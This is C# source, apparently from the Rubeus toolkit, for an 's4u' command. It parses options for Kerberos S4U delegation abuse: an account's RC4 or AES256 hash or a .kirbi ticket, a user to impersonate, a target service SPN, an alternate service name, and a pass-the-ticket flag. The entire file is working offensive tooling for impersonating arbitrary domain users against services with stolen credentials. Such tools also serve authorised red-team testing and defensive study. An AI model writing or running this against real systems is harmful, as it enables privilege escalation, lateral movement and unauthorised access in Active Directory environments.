using System;
using System.Collections.Generic;
using System.IO;

namespace Rubeus.Commands
{
    public class S4u : ICommand
    {
        public static string CommandName => "s4u";

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = "";
            string domain = "";
            string hash = "";
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial; // throwaway placeholder, changed to something valid

            if (arguments.ContainsKey("/user")) {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2) {
                    domain = parts[0];
                    user = parts[1];
                }
                else {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain")) {
                domain = arguments["/domain"];
            }
            bool ptt = arguments.ContainsKey("/ptt");
            string dc = arguments.ContainsKey("/dc") ? arguments["/dc"] : string.Empty;
            if (arguments.ContainsKey("/rc4")) {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            if (arguments.ContainsKey("/aes256")) {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            string targetUser = arguments.ContainsKey("/impersonateuser") ? arguments["/impersonateuser"] : string.Empty;
            string targetSPN = arguments.ContainsKey("/msdsspn") ? arguments["/msdsspn"] : string.Empty;
            string altSname = arguments.ContainsKey("/altservice") ? arguments["/altservice"] : string.Empty;
            if (string.IsNullOrEmpty(domain)) {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (string.IsNullOrEmpty(targetUser)) {
                Console.WriteLine("\r\n[X] You must supply a /impersonateuser to impersonate!\r\n");
                return;
            }
            if (string.IsNullOrEmpty(targetSPN)) {
                Console.WriteLine("\r\n[X] You must supply a /msdsspn !\r\n");
                return;
            }
            if (arguments.ContainsKey("/ticket")) {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64)) {
                    S4U.Execute(new KRB_CRED(Convert.FromBase64String(kirbi64)), targetUser,
                        targetSPN, ptt, dc, altSname);
                }
                else if (File.Exists(kirbi64)) {
                    S4U.Execute(new KRB_CRED(File.ReadAllBytes(kirbi64)), targetUser, targetSPN,
                        ptt, dc, altSname);
                }
                else {
                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                }
                return;
            }
            else if (arguments.ContainsKey("/user")) {
                // if the user is supplying a user and rc4/aes256 hash to first execute a TGT request
                user = arguments["/user"];
                if (string.IsNullOrEmpty(hash)) {
                    Console.WriteLine("\r\n[X] You must supply a /rc4 or /aes256 hash!\r\n");
                    return;
                }
                S4U.Execute(user, domain, hash, encType, targetUser, targetSPN, ptt, dc, altSname);
            }
            else {
                Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied for S4U!\r\n");
                Console.WriteLine("[X] Alternatively, supply a /user and </rc4:X | /aes256:X> hash to first retrieve a TGT.\r\n");
            }
        }
    }
}